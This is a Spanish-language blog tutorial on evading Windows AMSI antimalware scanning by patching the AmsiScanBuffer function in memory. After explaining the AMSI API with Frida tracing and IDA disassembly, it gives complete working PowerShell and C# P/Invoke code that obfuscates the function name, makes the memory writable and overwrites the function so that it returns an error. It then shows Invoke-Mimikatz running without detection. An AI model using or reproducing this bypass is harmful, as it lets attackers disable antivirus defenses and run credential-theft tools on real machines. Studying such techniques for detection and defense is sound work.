---
id: "como-parchear-amsiscanbuffer-para-evadir-amsi"
title: "Cómo parchear AmsiScanBuffer para evadir AMSI"
author: "miguel-angel-cortes"
publishedDate: 2023-03-27
updatedDate: 2023-03-27
image: "https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-0.webp"
description: "Aprende a evadir AMSI en Windows mediante el parcheo de la función AmsiScanBuffer, incluyendo el uso de pinvoke para llamar a APIs nativas y técnicas de ofuscación."
categories:
  - "windows"
draft: false
featured: false
lang: "es"
---

En este artículo estaremos viendo el concepto de AMSI, su funcionamiento y como se puede evadir parcheando una de sus funciones.

- [Introducción a AMSI](#introducción-a-amsi)
- [Funciones de amsi.dll](#funciones-de-amsidll)
- [Ofuscación](#ofuscación)
- [Parcheando la función AmsiScanBuffer() de amsi.dll](#parcheando-la-función-amsiscanbuffer-de-amsidll)

## Introducción a AMSI

Con el lanzamiento de Windows 10, Microsoft introdujo AMSI, una interfaz de programación de aplicaciones (API) que permite la detección de malware en una amplia variedad de lenguajes de programación, incluyendo PowerShell. AMSI actúa como un puente que conecta las aplicaciones con el software antivirus. Cada comando, macro o script que se ejecute en PowerShell, o en cualquier otro lenguaje de programación compatible con AMSI, es enviado al software antivirus a través de AMSI para su análisis.

![Diagrama de funcionamiento de AMSI como puente entre aplicaciones y antivirus](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-1.avif)

Aunque AMSI se introdujo inicialmente para PowerShell, con el tiempo se ha extendido a otros lenguajes de programación como JScript, VBScript, VBA y .NET (aunque realmente cualquiera puede integrar AMSI con sus programas usando las llamadas a la API ofrecidas por AMSI Interface). Esto quiere decir que, si por ejemplo (caso práctico), un archivo .exe está escrito en un lenguaje de programación compatible con .NET, como C# o Visual Basic .NET, y está diseñado para interactuar con el sistema operativo de Windows, AMSI estará presente para analizar su contenido.

Las llamadas a la API AMSI que el programa puede utilizar (en nuestro caso PowerShell) se define dentro del archivo `amsi.dll`, tan pronto como se inicia el proceso PowerShell, `amsi.dll` se carga en él. Podemos verificarlo con [Process Hacker](https://processhacker.sourceforge.io/):

![Process Hacker mostrando amsi.dll cargado en PowerShell](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-2.avif)

AMSI exporta ciertas funciones de la API para que sean usadas por el proceso para comunicarse con el software antivirus a través de RPC:

![Funciones exportadas por amsi.dll](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-3.avif)

Entre ellas, la que estaremos parcheando para bypasearlo.

## Funciones de amsi.dll

`AmsiInitialize`: El programa utiliza esta función para inicializar la interfaz AMSI en una aplicación de Windows. La función toma como entrada el nombre de la aplicación que está inicializando AMSI, y devuelve un identificador de sesión que se utiliza para identificar la sesión de escaneo de malware de la aplicación.

```c
HRESULT AmsiInitialize(
    LPCWSTR appName,
    HAMSICONTEXT *amsiContext
);
```

`AmsiOpenSession`: Toma el contexto que se devolvió de la llamada anterior y permite cambiar a esa sesión. Podemos alojar múltiples sesiones de AMSI si queremos.

```c
HRESULT AmsiOpenSession(
    HAMSICONTEXT amsiContext,
    HAMSISESSION *amsiSession
);
```

`AmsiScanString`: Toma nuestro string y devuelve el resultado, es decir, 1 si la string está limpia y 32768 si la string es maliciosa.

```c
HRESULT AmsiScanString(
    HAMSICONTEXT amsiContext,
    LPCWSTR string,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT *result
);
```

`AmsiScanBuffer`: Similar a `AmsiScanString()`, esta función coge el buffer en lugar de la string y devuelve el resultado.

```c
HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    PVOID buffer,
    ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT *result
);
```

`AmsiCloseSession`: Esta función simplemente cierra la sesión que fue abierta por el programa previamente usando `AmsiOpenSession()`.

```c
void AmsiCloseSession(
    HAMSICONTEXT amsiContext,
    HAMSISESSION amsiSession
);
```

Hemos visto un poco por encima las funciones de la API que usa AMSI, pero nosotros nos centraremos concretamente en las funciones `AmsiScanString()` y `AmsiScanBuffer()`.

## Ofuscación

La ofuscación es una técnica utilizada por los atacantes para dificultar el análisis de su código al AV. Esto se hace normalmente mediante el uso de diversas transformaciones de código que hacen que sea más difícil entender la intención del código, pero sin cambiar su funcionalidad.

Por ejemplo, un atacante puede usar técnicas como encriptación del código, renombramiento de variables y división del código para dificultar entender la funcionalidad del mismo.

AMSI envía el contenido al AV para determinar si es malicioso, por lo que si el contenido está ofuscado el AV no puede detectar si es malicioso.

![Concepto de ofuscación en AMSI](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-4.avif)

Si podemos ofuscar las palabras en el buffer de entrada detectado por el AV, podemos ejecutar casi cualquier script sin problemas. Sin embargo, ofuscar o eliminar todas las palabras detectadas no es del todo posible porque además de llevar bastante tiempo, cada proveedor de AV tendrá su propia firma y en constante actualización. En este post vamos a ver una alternativa a esta técnica.

## Parcheando la función AmsiScanBuffer() de amsi.dll

Este método parchea la función `AmsiScanBuffer()`. La librería `amsi.dll` se carga en el mismo espacio de memoria virtual, por lo que tenemos un control casi completo sobre ese espacio de direcciones.

> Esta función es similar a `AmsiScanString`, pero en lugar de escanear una cadena de caracteres, escanea un búfer de memoria en busca de contenido malicioso. Esto es útil para analizar archivos o fragmentos de código en memoria que no están representados como cadenas de caracteres.
> 
> Recordatorio del funcionamiento de `AmsiScanBuffer()`

Echemos un vistazo a las llamadas a la API AMSI que PowerShell hace con la ayuda de [FridaTools](https://github.com/frida/frida-tools). Cuando iniciamos una sesión en Frida, esta crea archivos handler que podemos modificar para imprimir argumentos y resultados en tiempo de ejecución. En nuestro caso editaremos el siguiente archivo:

- `C:\Users\User__handlers__\amsi.dll\AmsiScanBuffer.js`

![Archivo handler de Frida para AmsiScanBuffer](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-5.avif)

En la imagen de arriba podemos ver que hemos modificado el archivo para que nos imprima esos argumentos y el resultado del escaneo en la salida. Una vez que hemos editado el archivo, podemos iniciar el [tracer](https://github.com/frida/frida-tools/blob/main/frida_tools/tracer.py):

![Iniciando el tracer de Frida](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-6.avif)

De esta manera, estaremos monitorizando en tiempo real el proceso de PowerShell:

![Monitorización en tiempo real del proceso PowerShell](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-7.avif)

![Resultado del escaneo de AMSI mostrando detección de malware](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-8.avif)

Como mencionamos anteriormente, si la string que obtiene la función para analizarla es maliciosa, el escaneo nos devuelve como resultado 32768. En cambio, si la string no es detectada como maliciosa, el resultado del escaneo es 1.

Vamos a analizar la función `AmsiScanBuffer()` en más detalle. Para ello, vamos a usar [IDA Freeware](https://hex-rays.com/ida-free/):

![Abriendo amsi.dll en IDA Freeware](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-9.avif)

Abriremos el binario `amsi.dll`, y buscaremos en él la función:

![Análisis de AmsiScanBuffer en IDA mostrando bloques de código](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-10.avif)

En la imagen de arriba podemos ver varios bloques de código. El escaneo está formado por las instrucciones de la caja de la izquierda. Las instrucciones del bloque de código de arriba a la derecha es llamada cuando el argumento que es pasado no es válido, `80070057h` corresponde a `E_INVALIDARG`. Después la función termina.

Sabiendo esto, podemos parchear el inicio de la función `AmsiScanBuffer()` con las instrucciones del bloque de código que mencionamos anteriormente, es decir:

- `mov eax, 80070057h; ret`

Esto con el fin de que cuando `AmsiScanBuffer()` sea llamada, devuelva el código de error en lugar de realizar el escaneo AMSI. El byte que corresponde a estas instrucciones es `b857000780`.

Para parchear la función `AmsiScanBuffer()` usaremos las siguientes API calls:

- `LoadLibrary`: Para cargar la DLL `amsi.dll` en el espacio de direcciones.
- `GetProcAddress`: Para obtener la dirección de memoria de `AmsiScanBuffer()`.
- `VirtualProtect`: Para agregar permisos de escritura a la región de memoria, ya que por defecto tiene permisos RX. Necesitamos dar permisos de escritura para poder sobreescribir las instrucciones que mencionamos anteriormente y después volveremos a poner la región de memoria como RX.

Para poder llamar a estas API calls, tenemos que hacer uso de [pinvoke](https://learn.microsoft.com/es-es/dotnet/standard/native-interop/pinvoke). Primero necesitamos definir estos métodos con C# usando esta herramienta (que nos permite llamar a API no gestionadas en código gestionado) y luego cargar el código C# en la sesión de PowerShell usando `Add-Type`.

Antes de nada, la diferencia entre un código gestionado y no gestionado es la siguiente:

> El código gestionado es aquel que se ejecuta bajo un entorno controlado por un administrador de ejecución, como .NET Framework o .NET Core. Este entorno maneja automáticamente aspectos clave, como la asignación de memoria, la recolección de basura y la seguridad. El código gestionado generalmente se escribe en lenguajes de alto nivel como C# o Visual Basic .NET y ofrece una mayor abstracción y facilidad de uso para los desarrolladores.
> 
> Código gestionado

> El código no gestionado, en cambio, se ejecuta directamente en el sistema operativo sin la intervención de un administrador de ejecución. Este tipo de código suele estar escrito en lenguajes de bajo nivel como C o C++ y se utiliza para interactuar directamente con los recursos del sistema operativo. El manejo de la memoria, la seguridad y otros aspectos es responsabilidad del desarrollador en el caso del código no gestionado.
> 
> Código no gestionado

Dicho esto, el siguiente código hace uso de pinvoke para implementar llamadas a la API:

```csharp
$code = @"
using System;
using System.Runtime.InteropServices;

public class WinApi {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
}"@
```

En este código, cargamos las funciones que usaremos.

`System.Runtime.InteropServices` es donde se implementa pinvoke. Después definimos la firma para cada API nativa.

- `Add-Type $code`

Añadimos el código a la sesión de PowerShell con `Add-Type`. Una vez hecho esto, ya podremos usar las API calls que hemos implementado en la sesión de PowerShell. Ahora, introducimos lo siguiente:

```powershell
$amsiDll = [WinApi]::LoadLibrary("amsi.dll")
$asbAddr = [WinApi]::GetProcAddress($amsiDll,"Ams"+"iScan"+"Buf"+"fer")
$a = 0xB8
$b = 0x57
$c = 0x00
$d = 0x07
$e = 0x80
$f = 0xC3
$ret = ( $a,$b,$c,$d,$e,$f )
$out = 0
```

Al ejecutar este bloque de código en PowerShell lo que estamos haciendo es:

1. Primero obtenemos el handle de la librería `amsi.dll` y luego llamamos a `GetProcAddress()` para obtener la dirección de la función `AmsiScanBuffer` dentro de `amsi.dll`.
2. Definimos una variable llamada `$ret` que contiene los bytes que sobrescribirán las primeras instrucciones de `AmsiScanBuffer()`, `$out` es lo que contendrá el antiguo permiso de la región de memoria devuelto por `VirtualProtect`.

```powershell
[WinApi]::VirtualProtect($asbAddr, $ret.Length, 0x40, [ref]$out)
[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddr, $ret.Length)
[WinApi]::VirtualProtect($asbAddr, $ret.Length, $out, [ref]$null)
```

Ahora, en el código de arriba, estamos llamando a la función `VirtualProtect()` para cambiar el permiso de la región de memoria de `AmsiScanBuffer()` a RWX (0x40) y luego usamos `Marshal.Copy` para copiar los bytes de la región de memoria gestionada a una no gestionada. Después llamamos a `VirtualProtect()` de nuevo para cambiar los permisos de `AmsiScanBuffer()` a los permisos que hemos almacenado en `$out`.

![Ejecución del bypass de AMSI en PowerShell](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-11.avif)

Ahora, si lanzamos `Invoke-Mimikatz` la alerta de AMSI no se dispara, por lo que hemos conseguido sobrescribir correctamente los primeros bytes de la función `AmsiScanBuffer()`.

![Invoke-Mimikatz ejecutándose sin alertas de AMSI](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-12.avif)

Como curiosidad, esta es la manera en la que [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) bypasea el AMSI con su función:

![Código de Evil-WinRM para bypass de AMSI parte 1](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-13.avif)

![Código de Evil-WinRM para bypass de AMSI parte 2](https://cdn.deephacking.tech/i/posts/como-parchear-amsiscanbuffer-para-evadir-amsi/como-parchear-amsiscanbuffer-para-evadir-amsi-14.avif)
